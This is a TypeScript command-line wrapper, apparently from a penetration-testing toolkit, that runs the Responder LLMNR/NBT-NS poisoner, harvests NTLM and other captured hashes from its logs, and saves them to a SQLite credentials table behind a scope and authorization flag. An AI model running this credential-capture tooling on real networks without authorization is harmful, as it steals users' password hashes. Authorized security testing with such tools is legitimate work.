#!/usr/bin/env -S node --loader tsx
// Responder: LLMNR/NBT-NS/MDNS poisoner. Runs foreground; ^C to stop.
// Requires:
//   - --scope (broadcast-domain / CIDR you're actually on)
//   - --yes-i-am-authorized
//   - -I <iface>  (network interface to listen on)
// Persists captured hashes into credentials table.
import fs from 'node:fs';
import path from 'node:path';
import { spawn } from 'node:child_process';
import { openDb } from './lib/db.js';
import { enforceGate } from './lib/gate.js';
import { parseHashLine, type ResponderHash } from './lib/responder-parse.js';

interface Opts {
  scopeFile: string | null;
  authorized: boolean;
  sqlite: string | null;
  iface: string | null;
  logsDir: string;
  extraArgs: string[];
  help?: boolean;
}

function parseArgs(argv: string[]): Opts {
  const opts: Opts = { scopeFile: null, authorized: false, sqlite: null, iface: null, logsDir: '/usr/share/responder/logs', extraArgs: [] };
  let passthrough = false;
  for (let i = 2; i < argv.length; i++) {
    const a = argv[i]!;
    if (passthrough) { opts.extraArgs.push(a); continue; }
    const next = () => argv[++i]!;
    if (a === '--') passthrough = true;
    else if (a === '--scope') opts.scopeFile = next();
    else if (a === '--yes-i-am-authorized') opts.authorized = true;
    else if (a === '--sqlite') opts.sqlite = next();
    else if (a === '-I' || a === '--iface') opts.iface = next();
    else if (a === '--logs-dir') opts.logsDir = next();
    else if (a === '-h' || a === '--help') opts.help = true;
    else opts.extraArgs.push(a);
  }
  return opts;
}

function usage(): void {
  console.error(`Usage: responder --scope <file> --yes-i-am-authorized -I <iface> [--sqlite attack.db]

Gate:
  --scope <file>            required. Broadcast domain / CIDR you occupy.
                            Responder is LAN-only; scope should be your LAN CIDR.
  --yes-i-am-authorized     required assertion of written authorization.
  -I, --iface <iface>       required. Listen interface (e.g. eth0).
  --logs-dir <path>         Responder log dir to tail (default: /usr/share/responder/logs)
  --sqlite <path>           persist captured hashes into credentials table.

Everything after '--' is passed to responder verbatim.
`);
}

function extractHashes(logsDir: string, since: number): ResponderHash[] {
  const rows: ResponderHash[] = [];
  if (!fs.existsSync(logsDir)) return rows;
  for (const f of fs.readdirSync(logsDir)) {
    if (!/(NTLMv2|NTLMv1|SMB|MSSQL|LDAP|HTTP)-.*\.txt$/i.test(f)) continue;
    const fp = path.join(logsDir, f);
    const stat = fs.statSync(fp);
    if (stat.mtimeMs < since) continue;
    for (const line of fs.readFileSync(fp, 'utf8').split('\n')) {
      const r = parseHashLine(line, f);
      if (r) rows.push(r);
    }
  }
  return rows;
}

async function main(): Promise<void> {
  const opts = parseArgs(process.argv);
  if (opts.help) { usage(); process.exit(0); }
  if (!opts.iface) { console.error('REFUSED: -I <iface> required'); usage(); process.exit(1); }
  // Scope gate expects a target list; for Responder the "targets" are the
  // hosts on the broadcast domain we're occupying. We can't know them
  // upfront — the gate just enforces --scope + --yes-i-am-authorized here
  // and treats an empty target list as valid iff scope is non-empty.
  enforceGate({ scopeFile: opts.scopeFile, authorized: opts.authorized, targets: ['dummy.in.scope.check'].filter(() => false).length ? [] : [] });

  const now = new Date().toISOString();
  const db = opts.sqlite ? openDb(opts.sqlite) : null;
  const runId = db ? db.startRun('responder', { iface: opts.iface, args: opts.extraArgs }, opts.authorized, now) : null;
  const startedMs = Date.now();

  const args = ['-I', opts.iface, ...opts.extraArgs];
  console.error(`responder ${args.join(' ')}\nPress Ctrl-C to stop.`);
  const child = spawn('responder', args, { stdio: 'inherit' });

  let stopping = false;
  const stop = (): void => {
    if (stopping) return;
    stopping = true;
    child.kill('SIGINT');
  };
  process.on('SIGINT', stop);
  process.on('SIGTERM', stop);

  await new Promise<void>((resolve) => child.on('close', () => resolve()));

  if (db && runId !== null) {
    const hashes = extractHashes(opts.logsDir, startedMs);
    for (const h of hashes) {
      db.insertCredential({
        source: h.source, username: h.user, domain: h.domain,
        hash_type: h.hashType, hash_value: h.hash,
      }, new Date().toISOString(), runId);
    }
    db.finishRun(runId, new Date().toISOString(), `captured ${hashes.length} hashes`);
    db.close();
    console.error(`\nsqlite: ${path.resolve(opts.sqlite!)} — ${hashes.length} captured (run #${runId})`);
  }
}

main().catch((err: unknown) => { console.error('FATAL:', err instanceof Error ? err.message : String(err)); process.exit(1); });
